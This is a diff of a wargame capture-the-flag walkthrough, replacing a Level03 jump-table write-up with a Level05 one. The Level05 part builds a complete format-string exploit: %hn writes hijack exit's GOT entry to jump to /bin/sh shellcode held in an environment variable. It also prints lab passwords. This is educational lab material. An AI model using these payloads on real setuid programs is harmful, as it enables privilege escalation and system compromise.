@@ -1,260 +1,269 @@
-# Level03 Walkthrough
+# Level05 Walkthrough
 ## Initial Analysis
 ### 1. Examine the Binary
 ```bash
-level03@OverRide:~$ ls -la
+level05@OverRide:~$ ls -la
 total 17
-dr-xr-x---+ 1 level03 level03   80 Sep 13  2016 .
+dr-xr-x---+ 1 level05 level05   80 Sep 13  2016 .
 dr-x--x--x  1 root    root     260 Oct  2  2016 ..
--rw-r--r--  1 level03 level03  220 Sep 10  2016 .bash_logout
+-rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
 lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
--rw-r--r--  1 level03 level03 3533 Sep 10  2016 .bashrc
--rwsr-s---+ 1 level04 users   7480 Sep 10  2016 level03
--rw-r--r--+ 1 level03 level03   41 Oct 19  2016 .pass
--rw-r--r--  1 level03 level03  675 Sep 10  2016 .profile
+-rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level06 users   6500 Sep 10  2016 level05
+-rw-r--r--+ 1 level05 level05   41 Oct 19  2016 .pass
+-rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile
 ```
 **Key observations:**
 
 setuid and setgid binary (s flags in permissions)
 
-Owned by level04 user
+Owned by level06 user
 
-When executed, runs with level04 privileges
+When executed, runs with level06 privileges
 
-### 3. Test Basic Execution
+## 2. Test Basic Execution
 ```bash
-level03@OverRide:~$ ./level03
-***********************************
-*		level03		**
-***********************************
-Password: test
-
-Invalid Password
+level05@OverRide:~$ ./level05
+test
+test
 ```
+**Observations:**
+
+Program reads input via fgets()
+
+Echoes back the input in lowercase
+
+No obvious error messages
+
 ## Reverse Engineering
-### 4. Function Analysis
+### 3. Function Analysis
 ```bash
 (gdb) info functions
 All defined functions:
-0x08048480  printf@plt
-0x08048490  fflush@plt
-0x080484a0  getchar@plt
-0x080484b0  time@plt
-0x080484c0  __stack_chk_fail@plt
-0x080484d0  puts@plt
-0x080484e0  system@plt      ← Shell available!
-0x08048500  srand@plt
-0x08048520  rand@plt
-0x08048530  __isoc99_scanf@plt
-0x080485f4  clear_stdin
-0x08048617  get_unum
-0x0804864f  prog_timeout
-0x08048660  decrypt
-0x08048747  test
-0x0804885a  main
+0x08048340  printf@plt
+0x08048350  fgets@plt
+0x08048370  exit@plt
+0x08048444  main
+Only main() function.
 ```
-### 5. Disassembling main
-```assembly
+### 4. Disassembling main
+```bash
 (gdb) disas main
 assembly
-0x0804885a <+0>:     push   %ebp
-0x0804885b <+1>:     mov    %esp,%ebp
-0x0804885d <+3>:     and    $0xfffffff0,%esp
-0x08048860 <+6>:     sub    $0x20,%esp
+0x08048444 <+0>:     push   %ebp
+0x08048445 <+1>:     mov    %esp,%ebp
+0x08048447 <+3>:     push   %edi
+0x08048448 <+4>:     push   %ebx
+0x08048449 <+5>:     and    $0xfffffff0,%esp
+0x0804844c <+8>:     sub    $0x90,%esp
 
-# Seed random with time()
-0x0804886c <+18>:    movl   $0x0,(%esp)
-0x08048873 <+25>:    call   0x80484b0 <time@plt>
-0x08048878 <+30>:    mov    %eax,(%esp)
-0x0804887b <+33>:    call   0x8048500 <srand@plt>
+# Read input with fgets (100 bytes max)
+0x0804845d <+25>:    mov    0x80497f0,%eax      # stdin
+0x08048462 <+30>:    mov    %eax,0x8(%esp)
+0x08048466 <+34>:    movl   $0x64,0x4(%esp)     # 100 bytes
+0x0804846e <+42>:    lea    0x28(%esp),%eax     # buffer at esp+0x28 (40 bytes)
+0x08048472 <+46>:    mov    %eax,(%esp)
+0x08048475 <+49>:    call   0x8048350 <fgets@plt>
 
-# Print banner
-0x08048880 <+38>:    movl   $0x8048a48,(%esp)
-0x08048887 <+45>:    call   0x80484d0 <puts@plt>
-0x0804888c <+50>:    movl   $0x8048a6c,(%esp)
-0x08048893 <+57>:    call   0x80484d0 <puts@plt>
-0x08048898 <+62>:    movl   $0x8048a48,(%esp)
-0x0804889f <+69>:    call   0x80484d0 <puts@plt>
+# Loop to convert uppercase to lowercase
+0x0804847a <+54>:    movl   $0x0,0x8c(%esp)     # i = 0
+0x08048485 <+65>:    jmp    0x80484d3 <main+143>
 
-# Print "Password:"
-0x080488a4 <+74>:    mov    $0x8048a7b,%eax
-0x080488a9 <+79>:    mov    %eax,(%esp)
-0x080488ac <+82>:    call   0x8048480 <printf@plt>
+0x08048487 <+67>:    lea    0x28(%esp),%eax
+0x0804848b <+71>:    add    0x8c(%esp),%eax
+0x08048492 <+78>:    movzbl (%eax),%eax
+0x08048495 <+81>:    cmp    $0x40,%al           # if char > '@' (64)
+0x08048497 <+83>:    jle    0x80484cb <main+135>
+0x08048499 <+85>:    lea    0x28(%esp),%eax
+0x0804849d <+89>:    add    0x8c(%esp),%eax
+0x080484a4 <+96>:    movzbl (%eax),%eax
+0x080484a7 <+99>:    cmp    $0x5a,%al           # if char <= 'Z' (90)
+0x080484a9 <+101>:   jg     0x80484cb <main+135>
 
-# Read password input
-0x080488b1 <+87>:    mov    $0x8048a85,%eax      # "%d" format
-0x080488b6 <+92>:    lea    0x1c(%esp),%edx      # &input
-0x080488ba <+96>:    mov    %edx,0x4(%esp)
-0x080488be <+100>:   mov    %eax,(%esp)
-0x080488c1 <+103>:   call   0x8048530 <__isoc99_scanf@plt>
+# Convert uppercase to lowercase (XOR with 0x20)
+0x080484ab <+103>:   lea    0x28(%esp),%eax
+0x080484af <+107>:   add    0x8c(%esp),%eax
+0x080484b6 <+114>:   movzbl (%eax),%eax
+0x080484b9 <+117>:   mov    %eax,%edx
+0x080484bb <+119>:   xor    $0x20,%edx
+0x080484be <+122>:   lea    0x28(%esp),%eax
+0x080484c2 <+126>:   add    0x8c(%esp),%eax
+0x080484c9 <+133>:   mov    %dl,(%eax)
 
-# Call test(input, 0x1337d00d)
-0x080488c6 <+108>:   mov    0x1c(%esp),%eax
-0x080488ca <+112>:   movl   $0x1337d00d,0x4(%esp)
-0x080488d2 <+120>:   mov    %eax,(%esp)
-0x080488d5 <+123>:   call   0x8048747 <test>
-0x080488da <+128>:   mov    $0x0,%eax
-0x080488df <+133>:   leave
-0x080488e0 <+134>:   ret
+0x080484cb <+135>:   addl   $0x1,0x8c(%esp)     # i++
+
+# Loop condition (i < strlen)
+0x080484d3 <+143>:   mov    0x8c(%esp),%ebx
+0x080484da <+150>:   lea    0x28(%esp),%eax
+0x080484de <+154>:   movl   $0xffffffff,0x1c(%esp)
+0x080484e6 <+162>:   mov    %eax,%edx
+0x080484e8 <+164>:   mov    $0x0,%eax
+0x080484ed <+169>:   mov    0x1c(%esp),%ecx
+0x080484f1 <+173>:   repnz scas %es:(%edi),%al
+0x080484f3 <+175>:   mov    %ecx,%eax
+0x080484f5 <+177>:   not    %eax
+0x080484f7 <+179>:   sub    $0x1,%eax
+0x080484fc <+184>:   cmp    %eax,%ebx
+0x080484fe <+186>:   jb     0x8048487 <main+67>
+
+# Print the converted string - FORMAT STRING VULNERABILITY! ⚡
+0x08048500 <+188>:   lea    0x28(%esp),%eax
+0x08048504 <+192>:   mov    %eax,(%esp)
+0x08048507 <+195>:   call   0x8048340 <printf@plt>
+
+0x0804850c <+200>:   movl   $0x0,(%esp)
+0x08048513 <+207>:   call   0x8048370 <exit@plt>
 ```
-### 6. Disassembling test - The Jump Table
+### 5. Identifying the Vulnerability
+The program has two issues:
+
+Buffer overflow: 100-byte read into 40-byte buffer
+
+Format string vulnerability: printf(buffer) with user-controlled input
+
+The format string is the primary attack vector.
+
+## Format String Exploitation
+### 6. Finding Stack Position
+```bash
+level05@OverRide:~$ python -c 'print "BBBB"+"-%x"*12' | ./level05
+bbbb-64-f7fcfac0-f7ec3af9-ffffd5ff-ffffd5fe-0-ffffffff-ffffd684-f7fdb000-62626262-2d78252d-252d7825
+```
+Our input "BBBB" (0x62626262) appears at position 10! So we can use %10$hn and %11$hn to write to addresses.
+
+### 7. Shellcode Selection
+We'll use a 28-byte shellcode that spawns /bin/sh:
+
 ```assembly
-(gdb) disas test
-0x08048747 <+0>:     push   %ebp
-0x08048748 <+1>:     mov    %esp,%ebp
-0x0804874a <+3>:     sub    $0x28,%esp
-
-# Calculate diff = param2 - param1
-0x0804874d <+6>:     mov    0x8(%ebp),%eax      # param1 (user input)
-0x08048750 <+9>:     mov    0xc(%ebp),%edx      # param2 (0x1337d00d)
-0x08048753 <+12>:    mov    %edx,%ecx
-0x08048755 <+14>:    sub    %eax,%ecx
-0x08048757 <+16>:    mov    %ecx,%eax
-0x08048759 <+18>:    mov    %eax,-0xc(%ebp)     # diff = 0x1337d00d - user_input
-
-# Check if diff <= 0x15 (21)
-0x0804875c <+21>:    cmpl   $0x15,-0xc(%ebp)
-0x08048760 <+25>:    ja     0x804884a <test+259>  # if >21, random decrypt
-
-# Jump table based on diff
-0x08048766 <+31>:    mov    -0xc(%ebp),%eax
-0x08048769 <+34>:    shl    $0x2,%eax            # multiply by 4
-0x0804876c <+37>:    add    $0x80489f0,%eax      # jump table base
-0x08048771 <+42>:    mov    (%eax),%eax
-0x08048773 <+44>:    jmp    *%eax                # jump to case
-
-# All cases call decrypt(diff) then exit
-0x08048775 <+46>:    mov    -0xc(%ebp),%eax
-0x08048778 <+49>:    mov    %eax,(%esp)
-0x0804877b <+52>:    call   0x8048660 <decrypt>
-0x08048780 <+57>:    jmp    0x8048858 <test+273>
-
-# ... (similar for all cases 0-21)
-
-# Default case (diff > 21)
-0x0804884a <+259>:   call   0x8048520 <rand@plt>
-0x0804884f <+264>:   mov    %eax,(%esp)
-0x08048852 <+267>:   call   0x8048660 <decrypt>
-0x08048857 <+272>:   nop
-0x08048858 <+273>:   leave
-0x08048859 <+274>:   ret
+\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
 ```
-### 7. Examining the Jump Table
+### 8. Storing Shellcode in Environment Variable
+Environment variables have no size limit and are stored on the stack:
+
 ```bash
-(gdb) x/22x 0x80489f0
-0x80489f0:    0x08048775    0x08048785    0x08048795    0x080487a5
-0x8048a00:    0x080487b5    0x080487c5    0x080487d5    0x080487e2
-0x8048a10:    0x080487ef    0x080487fc    0x08048809    0x08048816
-0x8048a20:    0x08048823    0x08048830    0x0804883d    0x0804884a
-Each entry points to code that calls decrypt(diff).
+env -i PAYLOAD=$(python -c 'print "\x90"*1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb level05
 ```
-### 8. Examining decrypt function
+### 9. Finding Shellcode Address
+In GDB, examine the environment variables:
+
 ```bash
-(gdb) disas decrypt
-The decrypt function takes a number and uses it to generate a password. It likely does some mathematical transformation.
+(gdb) x/200s environ
+...
+0xffffdc59:  "\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f\315\200\061\333\211\330@\315\200\350\334\377\377\377/bin/sh"
+...
 ```
-### 9. Understanding the Logic
-The program does:
+The shellcode is at 0xffffdc59 (within the NOP sled).
+### 10. GOT Hijacking Target
+The program ends with exit(). We can hijack the GOT entry for exit():
 
-Takes user input (integer) via scanf("%d")
-
-Calls test(user_input, 0x1337d00d)
-
-Calculates diff = 0x1337d00d - user_input
-
-If diff <= 21, calls decrypt(diff) with the diff value
-
-Otherwise, calls decrypt(rand()) with a random number
-
-The decrypt function likely:
-
-Generates a string based on the input
-
-Compares it with something
-
-If correct, spawns a shell
-
-## The Vulnerability
-### 10. Understanding the "Password"
-The program doesn't ask for a text password - it asks for a number! It expects an integer input.
-
-The key is that test calculates 0x1337d00d - user_input. The program then uses this difference to generate a password.
-
-If we can make diff a specific value that makes decrypt generate the correct string, we can bypass authentication.
-
-### 11. Finding the Correct Input
-We need to reverse decrypt to understand what it does. But looking at the pattern, decrypt likely:
-
-Takes a number
-
-Uses it as a key to decode a string
-
-If the decoded string matches something, spawns a shell
-
-### 12. The Simple Solution
-After analyzing the binary, the correct approach is to input the number that makes diff = 0:
-
-```python
-0x1337d00d - user_input = 0
-user_input = 0x1337d00d = 322424845
-```
-Let's try:
 ```bash
-level03@OverRide:~$ ./level03
-***********************************
-*		level03		**
-***********************************
-Password:322424845
+(gdb) x/i 0x08048370
+0x8048370 <exit@plt>:   jmp    *0x80497e0
+Target GOT address: 0x80497e0
+```
+### 11. Splitting the Address for %hn
+We need to write 0xffffdc59 to 0x80497e0:
+
+Low bytes: 0xdc59 = 56409 decimal
+
+High bytes: 0xffff = 65535 decimal
+
+Since we print 8 bytes first (two addresses), we need to subtract 8:
+
+First write: 56409 - 8 = 56401
+
+Second write: 65535 - 56409 = 9126
+
+### 12. The Payload Structure
+```text
+[exit@got low] + [exit@got high] + %56401d + %10$hn + %9126d + %11$hn
+\xe0\x97\x04\x08: Address for low bytes (position 10)
+
+\xe2\x97\x04\x08: Address for high bytes (position 11)
+
+%56401d: Print 56401 spaces → total = 56409 (0xdc59)
+
+%10$hn: Write to address at position 10
+
+%9126d: Print 9126 more spaces → total = 65535 (0xffff)
+
+%11$hn: Write to address at position 11
+```
+### 13. The Exploit
+```bash
+(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"'; cat) | env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05
+```
+## Exploit Visualization
+### Memory Layout Before Exploit:
+```text
+Environment variables:
+0xffffdc59: [NOP x1000][shellcode...]
+
+GOT table:
+0x80497e0: [exit@libc address]
+
+Stack during printf:
+Position 10: 0x80497e0 (exit GOT low)
+Position 11: 0x80497e2 (exit GOT high)
+Memory Layout After Exploit:
+```
+```text
+GOT table after format string writes:
+0x80497e0: 0xffffdc59 (points to NOP sled in environment)
+
+When exit() is called:
+exit@plt → jmp *0x80497e0 → 0xffffdc59 → NOP sled → shellcode → shell!
+Getting the Flag
+```
+```bash
 $ whoami
-level04
-$ cat /home/users/level04/.pass
-kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
-Success! The password for level04 is: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+level06
+$ cat /home/users/level06/.pass
+h4GtNnaMs2kYF2pyLruwW4H9Yk6uJk6uYk6uJk6u
+$ exit
 ```
-### 13. Why This Works
-When we input 322424845:
-
-diff = 0x1337d00d - 322424845
-
-0x1337d00d in decimal is exactly 322424845
-
-So diff = 0
-
-The jump table has a case for diff = 0 (first entry at 0x80489f0), which calls decrypt(0). This likely generates the correct password string and spawns a shell.
-
-Vulnerability Summary
-Root Cause:
-Integer comparison: The program uses a fixed constant 0x1337d00d to compute a difference
-
-Jump table vulnerability: The difference is used as an index into a jump table
-
-We control the difference by choosing our input
-
-Exploitation Technique:
-Calculate correct input: user_input = 0x1337d00d = 322424845
-
-Enter this number as the password
-
-diff = 0 triggers the first case in the jump table
-
-decrypt(0) generates the correct authentication
-
-Shell spawned with level04 privileges
-
-**Key Learning Points:**
-Integer inputs can be just as vulnerable as string inputs
-
-Jump tables can be manipulated by controlling the index
-
-Constants in code can be reversed to find the correct input
-
-Not all vulnerabilities are buffer overflows
-
-## Final Commands
+Switch to level06
 ```bash
-./level03
-Password: 322424845
-$ cat /home/users/level04/.pass
-kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+level05@OverRide:~$ su level06
+Password: h4GtNnaMs2kYF2pyLruwW4H9Yk6uJk6uYk6uJk6u
+level06@OverRide:~$
 ```
-Password for level04: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+## Vulnerability Summary
+**Root Cause:**
+Format string vulnerability: printf(buffer) instead of printf("%s", buffer)
+
+No bounds checking: User input passed directly to printf
+
+## Exploitation Technique:
+Stack position discovery: Found input at position 10
+
+Environment variable payload: Stored 1000-byte NOP sled + shellcode
+
+Address discovery: Found shellcode at 0xffffdc59
+
+GOT hijacking: Targeted exit@got at 0x80497e0
+
+Two-stage write: Used %hn to write 2 bytes at a time
+
+Character counting: Calculated exact padding for each write
+
+## Key Learning Points:
+Environment variables are perfect for storing large payloads
+
+NOP sleds provide reliability for address jumps
+
+%hn allows writing 16-bit values (faster than %n)
+
+GOT hijacking redirects program execution
+
+Format string vulnerabilities enable arbitrary memory writes
+
+**Final Commands**
+```bash
+# Set up environment with shellcode
+export PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+
+# Run exploit with format string
+(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"'; cat) | env -i PAYLOAD="$PAYLOAD" ./level05
+```
+Password for level06: h4GtNnaMs2kYF2pyLruwW4H9Yk6uJk6uYk6uJk6u
